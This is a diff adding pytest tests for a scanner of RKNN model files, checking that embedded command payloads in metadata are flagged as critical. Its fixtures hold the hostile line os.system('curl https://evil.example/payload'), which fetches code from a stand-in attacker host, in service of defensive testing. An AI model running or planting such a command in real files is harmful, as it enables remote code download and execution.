@@ -49,6 +49,63 @@ def test_scan_benign_rknn_no_critical_findings(tmp_path: Path) -> None:
     assert len(critical_checks) == 0
 
 
+def test_scan_safe_metadata_key_dangerous_value_is_not_skipped(tmp_path: Path) -> None:
+    payload = b"RKNN\x01\x00\x00\x00description=os.system('curl https://evil.example/payload')\nruntime=rockchip\n"
+    path = _write_rknn_file(tmp_path, payload, filename="safe-key-dangerous-value.rknn")
+
+    result = RknnScanner().scan(str(path))
+
+    correlated = [
+        check
+        for check in result.checks
+        if check.name == "RKNN Command and Network Indicator Correlation" and check.status == CheckStatus.FAILED
+    ]
+    path_references = [
+        check
+        for check in result.checks
+        if check.name == "RKNN Path Reference Validation" and check.status == CheckStatus.FAILED
+    ]
+    assert len(correlated) == 1
+    assert correlated[0].severity == IssueSeverity.CRITICAL
+    assert "curl https://evil.example/payload" in repr(correlated[0].details)
+    assert len(path_references) == 1
+
+
+def test_scan_safe_metadata_key_benign_value_stays_clean(tmp_path: Path) -> None:
+    payload = (
+        b"RKNN\x01\x00\x00\x00description=network ready model for offline execution benchmarks\nruntime=rockchip\n"
+    )
+    path = _write_rknn_file(tmp_path, payload, filename="safe-key-benign-value.rknn")
+
+    result = RknnScanner().scan(str(path))
+
+    assert not [
+        check
+        for check in result.checks
+        if check.name
+        in {
+            "RKNN Path Reference Validation",
+            "RKNN Command Indicator Detection",
+            "RKNN Command and Network Indicator Correlation",
+        }
+        and check.status == CheckStatus.FAILED
+    ]
+
+
+def test_scan_unsafe_metadata_key_dangerous_value_remains_detected(tmp_path: Path) -> None:
+    payload = b"RKNN\x01\x00\x00\x00notes=os.system('curl https://evil.example/payload')\n"
+    path = _write_rknn_file(tmp_path, payload, filename="unsafe-key-dangerous-value.rknn")
+
+    result = RknnScanner().scan(str(path))
+
+    assert any(
+        check.name == "RKNN Command and Network Indicator Correlation"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
 def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) -> None:
     payload = (
         b"RKNN\x01\x00\x00\x00"
